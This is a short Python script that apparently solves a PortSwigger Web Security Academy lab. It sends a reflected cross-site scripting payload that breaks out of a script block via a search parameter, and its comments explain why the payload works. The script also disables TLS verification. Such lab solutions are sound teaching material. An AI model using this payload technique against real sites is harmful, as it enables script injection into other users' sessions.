# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped
import requests

requests.packages.urllib3.disable_warnings()

verify = False
scheme = "https://"
proxy = "127.0.0.1:8080"
proxies = {scheme: proxy}
host = "ac071fba1e2d7d6180a31d730089006f.web-security-academy.net"
path = ""
url = scheme + host + path
payload = "</script><script>alert(1)</script>"
params = {"search": payload}

requests.get(url, params=params, proxies=proxies, verify=verify)

# This is what the response looks like after successful exploit. Because the html is parsed before the javascript,
# this works even though it is incorrect javascript syntax.

# <script>
#     var searchTerms = '</script><script>alert(1)</script>';
#     document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
# </script>
